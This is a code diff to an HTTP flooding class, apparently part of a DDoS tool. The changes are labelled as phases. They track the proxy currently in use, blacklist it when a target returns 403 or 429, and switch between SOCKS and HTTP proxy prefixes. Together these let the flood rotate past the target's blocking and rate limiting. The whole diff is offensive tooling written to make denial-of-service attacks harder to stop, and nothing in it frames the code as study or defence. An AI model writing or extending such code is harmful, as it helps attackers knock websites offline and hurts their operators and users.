@@ -1114,6 +1114,7 @@ class HttpFlood(Thread):
             for _ in range(len(self._proxies)):
                 proxy = next(self._proxy_cycle)
                 if proxy.proxy not in BURNED_PROXIES:
+                    self._current_proxy = proxy.proxy # [PHASE 4] Track for blacklisting
                     sock = proxy.open_socket(AF_INET, SOCK_STREAM)
                     break
             else:
@@ -1466,10 +1467,8 @@ class HttpFlood(Thread):
                             if status_code in {"403", "429"}:
                                 # [PHASE 4] Blacklist the proxy
                                 try:
-                                    if self._proxies:
-                                        # Heuristic to find current proxy from cycle might be hard, 
-                                        # but most methods close/reopen per connection.
-                                        pass 
+                                    if hasattr(self, '_current_proxy'):
+                                        BURNED_PROXIES.add(self._current_proxy)
                                 except: pass
                                 raise Exception("Proxy Blocked")
                     except Exception as e:
@@ -1491,7 +1490,9 @@ class HttpFlood(Thread):
                 from itertools import cycle
                 self._proxy_cycle = cycle(self._proxies)
             p = next(self._proxy_cycle)
-            proxy_url = f"http://{p.proxy}" # Assuming HTTP proxy for now
+            # [PHASE 5] Smart Protocol Detection for httpx
+            prefix = "socks5://" if p.type in {ProxyType.SOCKS5, ProxyType.SOCKS4} else "http://"
+            proxy_url = f"{prefix}{p.proxy}"
             if p.proxy in BURNED_PROXIES: return
 
         headers = {
